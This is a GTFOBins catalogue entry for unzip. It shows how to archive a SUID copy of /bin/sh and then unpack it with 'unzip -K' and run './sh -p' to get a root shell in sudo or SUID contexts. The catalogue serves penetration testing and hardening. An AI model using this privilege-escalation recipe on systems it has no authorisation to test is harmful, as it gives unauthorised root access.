<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/unzip -->
---
comment: |-
  Certain `unzip` versions allows to preserve the SUID bit. For example, prepare an archive beforehand with the following commands as root:

  ```
  cp /bin/sh .
  chmod +s sh
  zip shell.zip sh
  ```
functions:
  privilege-escalation:
  - code: |-
      unzip -K shell.zip
      ./sh -p
    contexts:
      sudo:
      suid:
...
